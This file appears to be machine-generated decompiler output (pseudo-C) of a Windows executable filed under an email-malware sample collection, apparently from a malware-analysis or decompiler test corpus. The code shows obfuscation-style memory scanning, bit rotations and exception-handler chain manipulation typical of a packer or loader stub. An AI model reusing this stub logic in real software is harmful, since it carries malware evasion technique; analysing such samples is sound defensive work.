// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1192/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004011D3(word32 ebx, word32 ebp, word32 esi, word32 edi, word16 cx, selector fs, word32 dwArg00, UINT)
{
// def fp
// def dwArg00
// def Mem0
// def tArg04
// def ebp
// def fs
	if (Mem0[dwArg00 - 0xFFFFFFF9:word16] != 0x9090)
	{
		OpenFile(0xAB65A304, dwArg00, tArg04);
		return;
	}
	else
	{
		edx_63 = 0x00129090;
		esi_66 = Mem0[0x00129090:word32];
		edi_73 = Mem0[0x004010E6:word32];
		do
		{
// esi_77 = PHI(esi_66, esi_80)
// edx_78 = PHI(edx_63, edx_84)
			esi_80 = esi_77 + 0x00000001;
			edx_84 = edx_78 - 0xDC41351D;
			eax_86 = Mem0[esi_80 + 0x00000000:word32] - edi_73;
		} while (eax_86 != 0x00000000);
		edi_98 = __rol(edi_73 + 0xCBB482E5, 0x1E);
		eax_100 = DPB(eax_86, Mem0[esi_80 + 0xFFFFFFFE:word16], 0, 16);
		__rol((word16) ~edx_84, 0x0C);
		__ror(edi_98, 0x05);
		ecx_112 = dwArg00;
		eax_114 = 0x0040102E;
		esi_117 = Mem0[0x00401036:word32];
// ecx_122 = PHI(ecx_112, ecx_127)
// eax_124 = PHI(eax_114, eax_130)
		ecx_127 = ecx_122 + 0x00000001;
		edi_125 = Mem0[ecx_122 + 0x00000000:word32];
		cx_128 = (word16) ecx_127;
		eax_130 = eax_124 - 0x00000001;
		di_135 = (word16) (edi_125 & ebp);
		while ((edi_125 ^ esi_117) != 0x00000000)
		{
// ecx_122 = PHI(ecx_112, ecx_127)
// eax_124 = PHI(eax_114, eax_130)
			ecx_127 = ecx_122 + 0x00000001;
			edi_125 = Mem0[ecx_122 + 0x00000000:word32];
			cx_128 = (word16) ecx_127;
			eax_130 = eax_124 - 0x00000001;
			di_135 = (word16) (edi_125 & ebp);
		}
		__rol(di_135, 0x03);
		__ror(cx_128, 0x03);
		__ror(eax_130, 0x1B);
		__rol((word16) ((eax_100 << 0x00000010 >>u 0x00000010) + 0x003FBD1F) | 0xFFA2, 0x0D);
		Mem175[fs:0x00000000:word32] = fp - 0x00000008;
		return;
	}
}

